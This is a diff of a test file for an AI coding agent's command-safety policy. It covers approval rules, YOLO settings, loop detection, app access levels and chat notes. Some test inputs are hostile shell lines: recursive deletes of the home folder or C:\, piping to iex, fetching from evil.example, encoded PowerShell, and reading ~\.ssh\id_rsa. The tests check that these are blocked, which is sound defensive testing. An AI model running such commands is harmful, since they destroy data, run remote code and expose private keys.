@@ -12,10 +12,10 @@ import { pathToFileURL } from 'node:url';
 import { runLine, snapBefore, commandChanges, snapBeforeAsync, commandChangesAsync, restoreCheckpoint, reviewFiles, agentSpace } from '../server/workspace.js';
 import { snapshot, changesSince, snapshotAsync, changesSinceAsync } from '../server/snapshot.js';
 import { jobsAvailable, jobHostStatus } from '../server/jobhost.js';
-import { decide, agentWriteBlocked, suggestedRules, saveRules, loadRules } from '../server/cmdpolicy.js';
+import { decide, agentWriteBlocked, suggestedRules, saveRules, loadRules, ruleMatches, ruleProblem, addRule, updateRule, removeRule } from '../server/cmdpolicy.js';
 import { approvalJudge } from '../server/approvals.js';
 import { SAFETY_DEFAULTS, safetySettings, yoloOf } from '../server/safety.js';
-import { runAgent, answerApproval, raiseCap, answerQuestion } from '../server/agent.js';
+import { runAgent, answerApproval, raiseCap, answerQuestion, appLevel } from '../server/agent.js';
 import { startTripwire } from '../server/tripwire.js';
 import { listBackground, stopBackground } from '../server/bgjobs.js';
 import { listTerms, termStop } from '../server/agentterm.js';
@@ -269,7 +269,8 @@ test('rules: published bypasses never come out as allowed', { skip: !WIN }, asyn
     ['powershell', 'cargo build; Remove-Item -Recurse ~'],
     ['powershell', 'cargo build | iex'],
     ['powershell', 'cargo build $(iwr evil.example)'],
-    ['powershell', 'powershell -c "Remove-Item x"'],
+    ['powershell', 'powershell -c "Remove-Item ~ -Recurse"'],
+    ['powershell', 'powershell -c "Remove-Item $x"'],
     ['powershell', 'pwsh -EncodedCommand ZQBjAGgAbwA='],
     ['powershell', 'cmd /c "rd /s /q C:\\"'],
     ['powershell', '& $cmd'],
@@ -372,7 +373,9 @@ test('rules: YOLO runs reads, builds and one-liners on its own, and keeps the ex
     ['Disable-ScheduledTask x',                           'ask:deciders',       'ask:deciders',       'ask:deciders'],
     ['npm i -g typescript',                               'ask:user:warn',      'ask:user:warn',      'ask:user:warn'],
     ['git push',                                          'ask:user:warn',      'ask:user:warn',      'ask:user:warn'],
-    ['cmd /c dir',                                        'ask:user',           'ask:deciders',       'ask:deciders'],
+    ['cmd /c start notepad',                              'ask:user',           'ask:deciders',       'ask:deciders'],
+    // cmd /c with fixed text is judged by the command inside: a read stays a read.
+    ['cmd /c dir',                                        'allow',              'allow',              'allow'],
     ['taskkill /im node.exe /f',                          'ask:user:warn',      'ask:user:warn',      'ask:user:warn'],
     ['git clean -fd',                                     'ask:user:warn',      'ask:user:warn',      'ask:user:warn'],
     ['Get-Content ~\\.ssh\\id_rsa',                       'ask:user:danger',    'ask:user:danger',    'ask:user:danger'],
@@ -412,7 +415,7 @@ test('rules: each ⚡ YOLO setting moves its own kind of command, and nothing el
     assert.equal(await yrun(line, YOLO.defaults), 'ask:user:warn', `default: ${line}`);
     assert.equal(await yrun(line, with_({ [key]: true })), 'ask:deciders:warn', `${key}: ${line}`);
   }
-  assert.equal(await yrun('cmd /c dir', with_({ yoloOpaque: false })), 'ask:user', 'unticking “can’t read” sends it to you');
+  assert.equal(await yrun('cmd /c start notepad', with_({ yoloOpaque: false })), 'ask:user', 'unticking “can’t read” sends it to you');
   assert.equal(await yrun('sudo apt install x', with_({ yoloGlobal: true }), 'yolo'), 'ask:user:warn', 'sudo needs a password the deciders can’t type');
   // Old settings files with a level still load.
   assert.equal(safetySettings({ yoloLevel: 'careful' }).yoloCheckWeb, true);
@@ -764,7 +767,7 @@ test('deciders see the user’s words and the facts, never the agent’s reasons
 // ---------- the shell tool, end to end (scripted model, no network) ----------
 let rn = 0;
 const reply = (text, calls = []) => ({ text, toolCalls: calls.map(([name, args], i) => ({ id: `s${++rn}_${i}`, type: 'function', function: { name, arguments: JSON.stringify(args) } })), usage: { cost: 0 }, ms: 1, firstMs: 1, finishReason: 'stop' });
-async function agentRun(script, { settings = {}, prep, onEvent, chatId } = {}) {
+async function agentRun(script, { settings = {}, prep, onEvent, chatId, more = {}, ensemble } = {}) {
   const id = `sh${Date.now().toString(36)}${(rn++).toString(36)}`;
   // Each project gets its own parent folder, so the tripwire watches that and not the busy shared Temp folder.
   const dir = path.join(tmp('agent'), 'p'); fs.mkdirSync(dir);
@@ -774,8 +777,8 @@ async function agentRun(script, { settings = {}, prep, onEvent, chatId } = {}) {
   let i = 0;
   const chatStream = async (body) => { bodies.push(structuredClone(body)); return script(body, i++); };
   try {
-    await runAgent({ runId: id, projectId: id, ...(chatId ? { chatId } : {}), text: 'build my app', setup: { model: 'test/model' }, settings: { approval: 'strict', mediaEnabled: false, verify: false, review: 'off', checks: { gap: false, shots: false, click: false }, tools: { browser: { on: false } }, ...settings } },
-      (e) => { events.push(e); onEvent?.(e, id); }, new AbortController().signal, { chatStream, catalogue: [{ id: 'test/model', maxOut: 4000 }], quiet: true });
+    await runAgent({ runId: id, projectId: id, ...(chatId ? { chatId } : {}), ...more, text: more.text ?? 'build my app', setup: { model: 'test/model' }, settings: { approval: 'strict', mediaEnabled: false, verify: false, review: 'off', checks: { gap: false, shots: false, click: false }, tools: { browser: { on: false } }, ...settings } },
+      (e) => { events.push(e); onEvent?.(e, id); }, new AbortController().signal, { chatStream, catalogue: [{ id: 'test/model', maxOut: 4000 }], quiet: true, ...(ensemble ? { ensemble } : {}) });
     return { events, bodies, dir, id };
   } finally {
     // Background jobs a test started (an app it opened) end with the test, so a failed test can't hang the run.
@@ -934,7 +937,7 @@ test('shell: in YOLO with the deciders off and commands set to run, it runs with
 test('shell: with the deciders off, a command they would approve in your place waits for you even when set to run', { skip: !WIN }, async () => {
   await withDeciders(voteAll({ needed: 0.95, other: 0.03 }), async (sent) => {
     let asked = 0;
-    const { events, bodies } = await agentRun((b, i) => [reply('', [['shell', { command: 'cmd /c echo hi-from-cmd' }]]), reply('Done.')][i], {
+    const { events, bodies } = await agentRun((b, i) => [reply('', [['shell', { command: 'cmd /c "echo hi-from-cmd & for %i in (1) do rem %i"' }]]), reply('Done.')][i], {
       settings: { approval: 'yolo', deciders: false, decidersOff: { commands: 'run' }, yoloWaitSecs: 5, safety: { yoloLevel: 'careful', yoloOpaque: true } },
       onEvent: (e, id) => { if (e.t === 'approval' && e.mode === 'strict') { asked++; setTimeout(() => answerApproval(id, e.id, { approve: true }), 20); } } });
     assert.equal(sent.length, 0, 'no decider was asked');
@@ -1158,6 +1161,31 @@ test('loops: in Strict the user can say keep going, and it is not checked again'
   assert.equal(asked, 1);
   assert.equal(events.filter((e) => e.t === 'loop').length, 2);
   assert.equal(bodies.length, 13, 'it ran to the end');
+});
+
+test('loops: the same desktop screenshot after each step is not a loop; the same failing desktop call twice is', async () => {
+  const shots = Array.from({ length: 6 }, () => reply('', [['desktop', { action: 'windows', job: 'bg97' }]]));
+  const { events } = await agentRun((b, i) => (i < 6 ? shots[i] : reply('Done.')), { settings: { approval: 'yolo' } });
+  const loops = events.filter((e) => e.t === 'loop');
+  assert.ok(loops.length >= 1 && loops.every((e) => /same failing desktop call twice/.test(e.what)), JSON.stringify(loops));
+  const { events: ok } = await agentRun((b, i) => [reply('', [['plan', { items: [{ text: 'a', status: 'doing' }] }]]), ...Array.from({ length: 5 }, () => reply('', [['plan', { items: [{ text: 'a', status: 'doing' }] }]])), reply('Done.')][i], { settings: { approval: 'yolo' } });
+  assert.equal(ok.filter((e) => e.t === 'loop').length, 0, 'calls that succeed repeat freely');
+});
+
+test('look with no target right after desktop work looks at that window, not an empty browser tab', async () => {
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['desktop', { action: 'read', job: 'bg98' }]]),
+    reply('', [['look', { checks: [{ ask: 'The window shows a number', my_guess: 'yes', my_confidence: 0.5 }] }]]),
+    reply('OK.'),
+  ][i]);
+  assert.match(toolOut(bodies, 2), /bg98/, toolOut(bodies, 2));
+  assert.doesNotMatch(toolOut(bodies, 2), /Nothing is open/);
+});
+
+test('loops: a tool that repeats by nature (the browser, look) is caught on the same failing call twice in a row', async () => {
+  const { bodies, events } = await agentRun((b, i) => (i < 6 ? reply('', [['look', { target: 'desktop:bg99' }]]) : reply('Stuck.')), { settings: { approval: 'yolo' } });
+  assert.match(toolOut(bodies, 2), /made the same failing look call twice in a row/, toolOut(bodies, 2));
+  assert.ok(events.some((e) => e.t === 'loop'));
 });
 // ---------- the agent's terminal and desktop apps (P1) ----------
 const allow = (d, match) => { fs.mkdirSync(path.join(d, '.quorx'), { recursive: true }); saveRules('project', [{ effect: 'allow', match, by: 'user' }], d); };
@@ -1410,6 +1438,118 @@ test('deciders: the agent\'s own scratch script is judged on harm only', async (
   assert.equal((await withDeciders({ a: harmful, b: harmful, c: harmful }, () => judge({ harmOnly: true }))).approve, false);
 });
 
+// ---------- approvals that do what they say (from a computer-use chat with 21 approval cards) ----------
+test('rules: every "Always allow" suggestion matches the command it came from; rules that never match are named', { skip: !WIN }, async () => {
+  put('.quorx/scratch/calc.ps1', 'Get-ChildItem .\n');
+  for (const line of ['powershell -NoProfile -ExecutionPolicy Bypass -File .quorx\\scratch\\calc.ps1', 'git -C sub status', 'code --new-window D:\\x', 'node build.js --watch']) {
+    const d = await decide(line, sctx());
+    for (const s of d.segments) for (const k of ['exact', 'prefix', 'program']) assert.ok(ruleMatches(s.suggest[k], s.ruleText), `${line}: ${k} “${s.suggest[k]}” vs “${s.ruleText}”`);
+  }
+  const ps = (await decide('powershell -NoProfile -ExecutionPolicy Bypass -File .quorx\\scratch\\calc.ps1', sctx())).segments.find((s) => s.program === 'powershell');
+  assert.equal(ps.suggest.prefix, 'powershell -NoProfile -ExecutionPolicy Bypass -File .quorx\\scratch\\*', 'the script’s folder, not “powershell Bypass*”');
+  assert.match(ruleProblem('powershell Bypass*'), /option's value/);
+  assert.match(ruleProblem('ffmpeg -i a.mp4 b.mp4; ffmpeg -i c.mp4 d.mp4'), /several commands/);
+  assert.equal(ruleProblem('npm test*'), '');
+});
+
+test('rules: the agent’s scratch scripts are marked in any language; other scripts are not', { skip: !WIN }, async () => {
+  put('.quorx/scratch/calc.ps1', 'Get-ChildItem .\n');
+  put('.quorx/scratch/b.bat', '@echo off\r\necho hi\r\n');
+  put('tools/x.ps1', 'Get-ChildItem .\n');
+  const ps = await decide('powershell -NoProfile -ExecutionPolicy Bypass -File .quorx\\scratch\\calc.ps1', sctx());
+  assert.ok(ps.segments.some((s) => s.scratch === '.quorx/scratch/calc.ps1'), JSON.stringify(ps.segments.map((s) => [s.text, s.scratch])));
+  const bat = await decide('cmd /c .quorx\\scratch\\b.bat', sctx({ shell: 'cmd' }));
+  assert.ok(bat.segments.some((s) => s.scratch === '.quorx/scratch/b.bat'), JSON.stringify(bat.segments.map((s) => [s.text, s.scratch])));
+  assert.ok(!(await decide('powershell -File tools\\x.ps1', sctx())).segments.some((s) => s.scratch));
+});
+
+test('rules: cmd /c, powershell -Command and bash -c are judged by the command inside them', { skip: !WIN }, async () => {
+  for (const shell of ['powershell', 'cmd']) {
+    const out = await decide('cmd /c copy /Y a.txt D:\\elsewhere\\b.txt', sctx({ shell, mode: 'yolo' }));
+    assert.deepEqual([out.verdict, out.who], ['ask', 'user'], shell);
+    assert.match(out.why, /writes outside the project/, `${shell}: the same card as Copy-Item gets, not “can't read”`);
+    assert.equal(out.segments[0].wrap, 'cmd /c');
+  }
+  assert.equal((await decide('cmd /c dir', sctx())).verdict, 'allow');
+  assert.equal((await decide('powershell -NoProfile -Command "Get-ChildItem ."', sctx())).verdict, 'allow');
+  assert.equal((await decide('powershell -Command "$x = 1; Remove-Item $x"', sctx())).segments[0].cls, 'opaque', 'text with variables stays unread');
+  assert.equal((await decide('powershell -EncodedCommand ZABpAHIA', sctx())).segments[0].cls, 'opaque');
+  const robo = await decide('robocopy src out *.txt /R:3 /LOG:log.txt', sctx());
+  assert.deepEqual(robo.segments[0].paths.map((p) => p.raw), ['src', 'out'], 'switches and file patterns are not folders');
+  put('.quorx/scratch/out.ps1', 'Copy-Item a.txt D:\\elsewhere\\c.txt\n');
+  const sc = await decide('powershell -NoProfile -File .quorx\\scratch\\out.ps1', sctx({ mode: 'yolo' }));
+  assert.deepEqual([sc.verdict, sc.who], ['ask', 'user'], 'a script that writes outside the project shows that write');
+  assert.ok(sc.segments.some((s) => s.via === '.quorx/scratch/out.ps1' && s.paths.some((p) => p.zone === 'outside')));
+});
+
+test('shell: a rule that would not match its command is not saved, and you are told', { skip: !WIN }, async () => {
+  const { events, dir } = await agentRun((b, i) => [reply('', [['shell', { command: 'node build.js' }]]), reply('Done.')][i], {
+    prep: buildJs, onEvent: (e, id) => { if (e.t === 'approval' && e.mode === 'strict') setTimeout(() => answerApproval(id, e.id, { approve: true, rule: { match: 'node Bypass*', scope: 'project' } }), 10); } });
+  assert.ok(of(events, 'note').some((e) => /wasn't saved: it doesn't match this command/.test(e.msg)));
+  assert.equal(loadRules(dir).filter((r) => r.scope === 'project').length, 0);
+  assert.ok(!events.some((e) => e.t === 'cmd_rule'));
+});
+
+test('shell: in YOLO nobody answering never runs a read outside the project, however harmless', { skip: !WIN }, async () => {
+  const outside = path.join(tmp('outside'), 'notes.txt');
+  fs.writeFileSync(outside, 'secret-ish');
+  await withDeciders(voteAll({ needed: 0.5, other: 0.03 }), async () => {
+    const { events, bodies } = await agentRun((b, i) => [reply('', [['shell', { command: `Get-Content "${outside}"` }]]), reply('OK.')][i], {
+      settings: { approval: 'yolo', yoloWaitSecs: 1, safety: { yoloLevel: 'careful' } } });
+    const card = of(events, 'approval').find((e) => e.mode === 'strict');
+    assert.equal(card?.wait?.then, 'skip', 'the card says it will be skipped');
+    const done = of(events, 'approval_done').at(-1);
+    assert.deepEqual([done.by, done.approve], ['timeout', false]);
+    assert.match(done.reason, /only runs on your yes/);
+    assert.doesNotMatch(toolOut(bodies, 1), /secret-ish/);
+  });
+});
+
+test('shell: a command that ran only because nobody answered asks again the next time', { skip: !WIN }, async () => {
+  await withDeciders(voteAll({ needed: 0.5, other: 0.03 }), async () => {
+    const { events } = await agentRun((b, i) => [reply('', [['shell', { command: 'node build.js' }]]), reply('', [['shell', { command: 'node build.js' }]]), reply('Done.')][i], {
+      settings: { approval: 'yolo', yoloWaitSecs: 1, safety: { yoloLevel: 'careful' } }, prep: buildJs });
+    assert.equal(of(events, 'approval').filter((e) => e.mode === 'strict').length, 2, 'two cards, not one and a silent repeat');
+  });
+});
+
+test('shell: a repeat of a command you approved says so in the chat', { skip: !WIN }, async () => {
+  const { events } = await agentRun((b, i) => [reply('', [['shell', { command: 'node build.js' }]]), reply('', [['shell', { command: 'node build.js' }]]), reply('Done.')][i], {
+    prep: buildJs, onEvent: (e, id) => { if (e.t === 'approval' && e.mode === 'strict') setTimeout(() => answerApproval(id, e.id, { approve: true }), 10); } });
+  assert.equal(of(events, 'approval').filter((e) => e.mode === 'strict').length, 1);
+  assert.ok(of(events, 'note').some((e) => /Ran without asking again: “node build\.js” was approved earlier/.test(e.msg)));
+});
+
+test('fresh eyes: a page written in parts with append_file is not “the same problem twice”', async () => {
+  const { events } = await agentRun((b, i) => [
+    reply('', [['write_file', { path: 'page.html', content: '<!doctype html>\n<html><head><title>x</title></head>\n<body>\n' }]]),
+    reply('', [['append_file', { path: 'page.html', content: '<main><p>one</p></main>\n' }]]),
+    reply('', [['append_file', { path: 'page.html', content: '<footer>two</footer>\n' }]]),
+    reply('', [['append_file', { path: 'page.html', content: '</body>\n</html>\n' }]]),
+    reply('Done.'),
+  ][i], { settings: { freshEyes: true } });
+  assert.ok(!events.some((e) => e.t === 'fresh_eyes_start'), 'no helper while the page is still being written');
+});
+
+test('launch entries: the user’s entry is never overwritten by name; replacing it asks', { skip: !WIN }, async () => {
+  const mine = { version: 1, configurations: [{ name: 'site', command: 'node', args: ['.quorx/serve.mjs', 'index.html'] }] };
+  let cards = 0;
+  const { bodies, dir } = await agentRun((b, i) => [
+    reply('', [['launch_config', { action: 'save', name: 'site', command: 'node', args: ['.quorx/serve.mjs', 'other.html'] }]]),
+    reply('', [['launch_config', { action: 'save', name: 'site', old_name: 'site', command: 'node', args: ['.quorx/serve.mjs', 'other.html'] }]]),
+    reply('', [['launch_config', { action: 'save', name: 'mine-too', command: 'node', args: ['a.js'] }]]),
+    reply('', [['launch_config', { action: 'save', name: 'mine-too', command: 'node', args: ['b.js'] }]]),
+    reply('Done.'),
+  ][i], { prep: (d) => { fs.mkdirSync(path.join(d, '.quorx'), { recursive: true }); fs.writeFileSync(path.join(d, '.quorx', 'launch.json'), JSON.stringify(mine)); },
+    onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'launch_config') { cards++; setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } } });
+  assert.match(toolOut(bodies, 1), /^Error: a launch config named "site" already exists/);
+  assert.equal(cards, 1, 'replacing on purpose asks you');
+  assert.match(toolOut(bodies, 2), /kept their launch entry "site"/);
+  assert.match(toolOut(bodies, 4), /Saved:\n- mine-too: node b\.js/, 'an entry made in this reply can change freely');
+  const file = JSON.parse(fs.readFileSync(path.join(dir, '.quorx', 'launch.json'), 'utf8'));
+  assert.deepEqual(file.configurations.find((c) => c.name === 'site').args, ['.quorx/serve.mjs', 'index.html']);
+});
+
 // ---------- last, because it starts a job and a terminal (earlier tests expect to get bg1 and t1) ----------
 // A command you approved may run in the background (a tunnel, a server), and moving it to the terminal tool in the
 // same reply doesn't ask again. wait.js only waits: nothing here changes the computer.
@@ -1461,4 +1601,534 @@ test('commands and the agent’s terminal start with no pager, editor or git pro
     for (let k = 0; k < 20 && !screen.includes('ENV='); k++) screen = (await termRead(s.id, 1000)).screen;
     assert.match(screen.replace(/\s+/g, ''), new RegExp(want));
   } finally { await termStop(s.id).catch(() => {}); }
+});
+
+// ---------- apps stay open after use (last: it starts background jobs) ----------
+// A program a command opened and left showing a window is what the command was for: it stays open, outside QuorX's
+// job, so the agent and the user can keep using it. Windowless leftovers (a stray ping) are still ended.
+const FORM = (title) => `Add-Type -AssemblyName System.Windows.Forms\n$f = New-Object Windows.Forms.Form; $f.Text = '${title}'\n[void]$f.ShowDialog()\n`;
+const formOpen = (title) => /powershell/i.test(execSync(`tasklist /FI "WINDOWTITLE eq ${title}" /NH`).toString());
+const closeForm = (title) => { try { execSync(`taskkill /FI "WINDOWTITLE eq ${title}" /F`, { stdio: 'ignore' }); } catch { /* gone */ } };
+test('stop: a window a command opened stays open after it; a windowless leftover is still ended', { skip: !WIN }, async () => {
+  const root = tmp('kept');
+  fs.writeFileSync(path.join(root, 'form.ps1'), FORM('QX Kept Form'));
+  try {
+    const r = await runLine(root, "Start-Process powershell -ArgumentList '-NoProfile','-File','form.ps1'", { shell: 'powershell' });
+    assert.ok(r.leftovers?.kept?.some((n) => /powershell/i.test(n)), JSON.stringify(r.leftovers));
+    assert.match(r.out, /kept open: .*powershell\.exe/i);
+    await new Promise((x) => setTimeout(x, 500));
+    assert.ok(formOpen('QX Kept Form'), 'the form is still open');
+    const p = await runLine(root, 'start /b ping -n 30 127.0.0.1 >nul & echo started', { shell: 'cmd' });
+    assert.ok(p.leftovers?.ended?.some((n) => /ping/i.test(n)) && !p.leftovers.kept, JSON.stringify(p.leftovers));
+    assert.equal(pingsLeft(), 0);
+  } finally { closeForm('QX Kept Form'); }
+});
+
+test('desktop: a background job whose launcher exits keeps running while its window is open, and job_stop ends it', { skip: !WIN }, async () => {
+  let job = null;
+  try {
+    const { bodies } = await agentRun((b, i) => {
+      if (i === 0) return reply('', [['shell', { command: "Start-Process powershell -ArgumentList '-NoProfile','-File','form.ps1'", background: true }]]);
+      if (i === 1) { job = toolOut([b], 0).match(/job (bg\d+)/)[1]; return reply('', [['desktop', { action: 'windows', job }]]); }
+      if (i === 2) return reply('', [['job_stop', { job }]]);
+      return reply('Done.');
+    }, { prep: (d) => { fs.writeFileSync(path.join(d, 'form.ps1'), FORM('QX Bg Form')); allow(d, 'start-process powershell*'); } });
+    assert.match(toolOut(bodies, 2), /QX Bg Form/, 'the job still reaches the window after its launcher exited');
+    assert.match(toolOut(bodies, 3), /0 processes left/);
+    assert.equal(formOpen('QX Bg Form'), false);
+  } finally { closeForm('QX Bg Form'); }
+});
+
+// desktop open needs the Start menu, which CI's Windows Server images may not have.
+test('desktop open: an app the user doesn’t allow is not opened; an unknown name says so', { skip: !WIN || !!process.env.CI }, async () => {
+  let card = null;
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['desktop', { action: 'open', app: 'No Such App Qx' }]]),
+    reply('', [['desktop', { action: 'open', app: 'Calculator' }]]),
+    reply('', [['desktop', { action: 'read', app: 'Calculator' }]]),
+    reply('OK.'),
+  ][i], { chatId: 'apps-chat', settings: { appsAccess: true }, onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'desktop') { card = e; setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } } });
+  assert.match(toolOut(bodies, 1), /no app called "No Such App Qx"/);
+  assert.match(card?.what || '', /Calculator on your computer/);
+  assert.match(toolOut(bodies, 2), /didn't allow Calculator/);
+  assert.match(toolOut(bodies, 3), /isn't open for this chat yet/, 'a declined app stays out of reach');
+});
+
+test('computer use: each app starts at its kind’s level; some are never used', () => {
+  assert.equal(appLevel('Calculator'), 'full');
+  assert.equal(appLevel('Brave'), 'view', 'browsers: the browser tool acts there');
+  assert.equal(appLevel('Google Chrome'), 'view');
+  assert.equal(appLevel('File Explorer'), 'view', 'it can delete files');
+  assert.equal(appLevel('Visual Studio Code'), 'click', 'commands go through shell');
+  assert.equal(appLevel('Windows Terminal'), 'click');
+  for (const n of ['QuorX', 'Claude', 'Electron', '1Password', 'Bitwarden', 'Registry Editor', 'Task Manager']) assert.equal(appLevel(n), 'never', n);
+});
+
+// ---------- each chat's own agent notes, and chats kept off the project ----------
+test('chat notes: a chat reads and writes its own notes; in the project it reads AGENT.md and the log too', async () => {
+  const chatId = 'cnotesin1';
+  const { bodies, dir } = await agentRun((b, i) => [reply('', [['append_file', { path: `.quorx/chats/${chatId}.md`, content: '- VRoid: right-drag turns the camera\n' }]]), reply('Done.')][i], {
+    chatId, prep: (d) => { fs.writeFileSync(path.join(d, 'AGENT.md'), '# Proj\nShared project fact ZEBRA.\n'); fs.mkdirSync(path.join(d, '.quorx', 'chats'), { recursive: true }); fs.writeFileSync(path.join(d, '.quorx', 'chats', `${chatId}.md`), 'Chat fact OTTER.\n'); } });
+  const sys = JSON.stringify(bodies[0].messages);
+  assert.match(sys, /\[Project notes: AGENT\.md\][^]*ZEBRA/);
+  assert.match(sys, /\[This chat's own notes: \.quorx\/chats\/cnotesin1\.md\][^]*OTTER/);
+  assert.match(toolOut(bodies, 1), /^(Appended|Added|Wrote)/i, toolOut(bodies, 1));
+  assert.match(fs.readFileSync(path.join(dir, '.quorx', 'chats', `${chatId}.md`), 'utf8'), /right-drag turns the camera/);
+});
+
+test('chat notes: a chat off the project skips its notes, design and log, and can\'t change AGENT.md; another chat\'s notes stay off limits', async () => {
+  const chatId = 'cnotesoff1';
+  const { bodies, dir } = await agentRun((b, i) => [
+    reply('', [['edit_file', { path: 'AGENT.md', find: 'ZEBRA', replace: 'LION' }]]),
+    reply('', [['write_file', { path: '.quorx/chats/otherchat1.md', content: 'x' }]]),
+    reply('', [['write_file', { path: 'notes.txt', content: 'hi' }]]),
+    reply('Done.'),
+  ][i], { chatId, more: { offProject: true }, prep: (d) => { fs.writeFileSync(path.join(d, 'AGENT.md'), '# Proj\nShared project fact ZEBRA.\n'); fs.writeFileSync(path.join(d, 'DESIGN.md'), '# Look\nCORAL accents.\n'); } });
+  const sys = JSON.stringify(bodies[0].messages);
+  assert.doesNotMatch(sys, /ZEBRA|CORAL/, 'the project notes and design are not loaded');
+  assert.match(sys, /\[This chat is off the project\]/);
+  assert.match(toolOut(bodies, 1), /^Refused: this chat is off the project, so AGENT\.md/);
+  assert.match(toolOut(bodies, 2), /^Refused: QuorX’s own files/);
+  assert.match(fs.readFileSync(path.join(dir, 'AGENT.md'), 'utf8'), /ZEBRA/);
+  assert.ok(!fs.existsSync(path.join(dir, '.quorx', 'log.md')) || !/notes\.txt/.test(fs.readFileSync(path.join(dir, '.quorx', 'log.md'), 'utf8')), 'nothing in the work log');
+});
+
+test('named in the user\'s message: a folder is read with no card; in YOLO an app is raised with no card (only the user\'s words count)', async () => {
+  const outside = tmp('named-folder');
+  fs.mkdirSync(path.join(outside, 'site'));
+  fs.writeFileSync(path.join(outside, 'site', 'index.html'), '<h1>NAMED PAGE</h1>');
+  let cards = 0;
+  const named = await agentRun((b, i) => [reply('', [['read_file', { path: path.join(outside, 'site', 'index.html') }]]), reply('OK.')][i], {
+    chatId: 'named-folder1', more: { text: `Open the folder ${path.join(outside, 'site')} and tell me what the page says.` },
+    onEvent: (e, id) => { if (e.t === 'approval') { cards++; setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } } });
+  assert.match(toolOut(named.bodies, 1), /NAMED PAGE/);
+  assert.equal(cards, 0, 'no card for a folder the user named');
+  const unnamed = await agentRun((b, i) => [reply('', [['read_file', { path: path.join(outside, 'site', 'index.html') }]]), reply('OK.')][i], {
+    chatId: 'named-folder2', onEvent: (e, id) => { if (e.t === 'approval') { cards++; setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } } });
+  assert.match(toolOut(unnamed.bodies, 1), /didn't add/);
+  assert.equal(cards, 1, 'a folder the user didn\'t name still asks');
+  const apps = [{ name: 'Visual Studio Code', appId: 'Microsoft.VisualStudioCode', level: 'click' }];
+  const raised = await agentRun((b, i) => [reply('', [['desktop', { action: 'keys', app: 'Visual Studio Code', keys: 'x' }]]), reply('OK.')][i], {
+    chatId: 'named-app1', settings: { approval: 'yolo', appsAccess: true }, more: { apps, text: 'Open VS Code and ask Cline to build a page.' } });
+  assert.doesNotMatch(toolOut(raised.bodies, 1), /isn't allowed/, toolOut(raised.bodies, 1));
+  assert.ok(raised.events.some((e) => e.t === 'app_allowed' && e.app.level === 'full'));
+});
+
+test('chat notes: "ignore the context of this project" in the user\'s words makes it an Own chat', async () => {
+  const prep = (d) => fs.writeFileSync(path.join(d, 'AGENT.md'), '# Proj\nShared project fact ZEBRA.\n');
+  const off = await agentRun((b, i) => [reply('OK.')][i], { chatId: 'offwords1', prep, more: { text: 'ignroe the context of quorx in this project for this activity ok. Open VS Code.' } });
+  assert.doesNotMatch(JSON.stringify(off.bodies[0].messages), /ZEBRA/);
+  assert.ok(off.events.some((e) => e.t === 'chat_off_project'), 'the page hears it and keeps it');
+  const off2 = await agentRun((b, i) => [reply('OK.')][i], { chatId: 'offwords3', prep, more: { text: 'ignore this project context and work on this but save in this project' } });
+  assert.ok(off2.events.some((e) => e.t === 'chat_off_project'), '"this project context" too');
+  const on = await agentRun((b, i) => [reply('OK.')][i], { chatId: 'offwords2', prep, more: { text: 'Fix the bug in this project, and read the folder outside the project too.' } });
+  assert.match(JSON.stringify(on.bodies[0].messages), /ZEBRA/);
+  assert.ok(!on.events.some((e) => e.t === 'chat_off_project'));
+});
+
+test('a long text typed into the user\'s app is checked against their words first; the same text again goes through', async () => {
+  const seen = [];
+  const ensemble = async ({ questions, state }) => { seen.push({ ask: questions[0].ask, state: String(state) }); return { results: Object.fromEntries(questions.map((q) => [q.id, { pick: 'no', dist: { yes: 0.2, no: 0.8 }, confidence: 0.8, agree: 3, n: 3, verdict: 'settled' }])), votes: [] }; };
+  const brief = `Build a page about Rem built in VRoid Studio with Blender, and delete the old page. ${'More detail. '.repeat(20)}`;
+  const apps = [{ name: 'Visual Studio Code', appId: 'Microsoft.VisualStudioCode', level: 'full' }];
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['desktop', { action: 'type', app: 'Visual Studio Code', ref: 1, text: brief }]]),
+    reply('', [['desktop', { action: 'type', app: 'Visual Studio Code', ref: 1, text: brief }]]),
+    reply('OK.'),
+  ][i], { chatId: 'brief-check1', settings: { appsAccess: true }, more: { apps, text: 'Ask Cline to build a page about the Rem I made in VRoid Studio.' }, ensemble });
+  assert.match(toolOut(bodies, 1), /^Not typed yet: the deciders think this text adds things the user didn't say/);
+  assert.doesNotMatch(toolOut(bodies, 2), /^Not typed yet/, 'asked once per text');
+  assert.equal(seen.filter((s) => /comes from the user's request/.test(s.ask)).length, 1);
+  assert.match(seen[0].state, /the Rem I made in VRoid Studio[^]*with Blender/, 'they see the user\'s words and the text');
+});
+
+// Answers "Let the agent … in <app>" (raising an app's level) with no, so a test sees the level hold.
+const keepLevel = (e, id) => { if (e.t === 'approval' && e.tool === 'desktop' && /^Let the agent/.test(e.what || '')) setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); };
+
+test('computer use: an action above an app\'s level asks once to raise it; yes raises it for the chat', async () => {
+  const apps = [{ name: 'Calculator', appId: 'Microsoft.WindowsCalculator_8wekyb3d8bbwe!App', level: 'view' }];
+  const cards = [];
+  const { events, bodies } = await agentRun((b, i) => [
+    reply('', [['desktop', { action: 'scroll', app: 'Calculator', direction: 'down' }]]),
+    reply('', [['desktop', { action: 'keys', app: 'Calculator', keys: '1' }]]),
+    reply('OK.'),
+  ][i], { chatId: 'apps-raise', settings: { appsAccess: true }, more: { apps },
+    onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'desktop') { cards.push(e.what); setTimeout(() => answerApproval(id, e.id, { approve: /click$/.test(e.what) }), 10); } } });
+  assert.deepEqual(cards, ['Let the agent click in Calculator · view → click', 'Let the agent type and use keys in Calculator · click → full']);
+  assert.doesNotMatch(toolOut(bodies, 1), /isn't allowed/, 'raised to click, so the scroll went ahead');
+  assert.match(toolOut(bodies, 2), /look, click, scroll and drag, not type in Calculator, so keys isn't allowed/, 'declined: the level stays');
+  assert.deepEqual(events.filter((e) => e.t === 'app_allowed').map((e) => e.app.level), ['click']);
+});
+
+test('computer use: off in a chat, the user’s apps are out of reach; on, each app is held to its level', async () => {
+  let cards = 0;
